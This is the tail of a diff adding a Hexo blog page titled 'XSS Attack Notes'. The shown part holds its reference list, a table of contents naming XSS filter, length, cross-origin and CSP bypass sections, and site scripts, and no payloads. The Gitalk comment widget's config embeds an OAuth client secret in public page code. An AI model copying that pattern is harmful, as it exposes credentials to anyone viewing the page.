+<p>其余参考<a href="http://help.dottoro.com/ljfvvdnm.php" target="_blank" rel="noopener">这里</a></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li>《白帽子讲Web安全》——吴翰清</li>
+<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li>
+<li><a href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/" target="_blank" rel="noopener">http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals</a></li>
+<li><a href="http://help.dottoro.com/ljfvvdnm.php" target="_blank" rel="noopener">http://help.dottoro.com/ljfvvdnm.php</a></li>
+</ul>
+
+          
+<div class="post-copyright">
+<p><span>本文标题：</span>XSS Attack Notes</p>
+<p><span>文章作者：</span>Mads</p>
+<p><span>发布时间：</span>2019/04/10 04:39:04</p>
+<p><span>更新时间：</span>2019/04/10 04:51:14</p>
+<p><span>原始链接：</span><a style="color: #bababa" href=" + data.permalink + ">http://lxzmads.github.io/2019/04/10/XSS-Attack-Notes/</a></p>
+<p><span>许可协议：</span><i class="fab fa-creative-commons"></i><a rel="license" style="color: #bababa" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a><span class="warn">转载请保留原文链接及作者</span></p>
+</div>
+ 
+        </section>
+    </article>
+    
+    <div class="comment">
+        <div id="gitalk-container"></div>
+    </div>
+    
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS检测"><span class="toc-number">1.</span> <span class="toc-text">XSS检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#基本姿势"><span class="toc-number">2.</span> <span class="toc-text">基本姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#可以X的地方"><span class="toc-number">2.1.</span> <span class="toc-text">可以X的地方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Vector-举栗"><span class="toc-number">2.2.</span> <span class="toc-text">XSS Vector 举栗</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-绕过"><span class="toc-number">3.</span> <span class="toc-text">XSS 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本条件"><span class="toc-number">3.1.</span> <span class="toc-text">基本条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解释器特性"><span class="toc-number">3.1.1.</span> <span class="toc-text">解释器特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解释器的自动解码"><span class="toc-number">3.1.2.</span> <span class="toc-text">解释器的自动解码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通用绕过技术"><span class="toc-number">3.1.3.</span> <span class="toc-text">通用绕过技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#长度限制绕过"><span class="toc-number">3.2.</span> <span class="toc-text">长度限制绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#跨域限制绕过"><span class="toc-number">3.3.</span> <span class="toc-text">跨域限制绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP绕过"><span class="toc-number">3.4.</span> <span class="toc-text">CSP绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#附录"><span class="toc-number">4.</span> <span class="toc-text">附录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Events-in-JavaScript"><span class="toc-number">4.1.</span> <span class="toc-text">Events in JavaScript</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<script type="text/javascript">
+const gitalk = new Gitalk({
+  clientID: "6ae565c159db15a6167c",
+  clientSecret: '6b81331560c108209346bc4807a5126da190e14c',
+  repo: 'blogcomments',
+  owner: 'lxzmads',
+  admin: ['lxzmads'],
+  id: decodeURI(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath-魔改版 by Mads</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
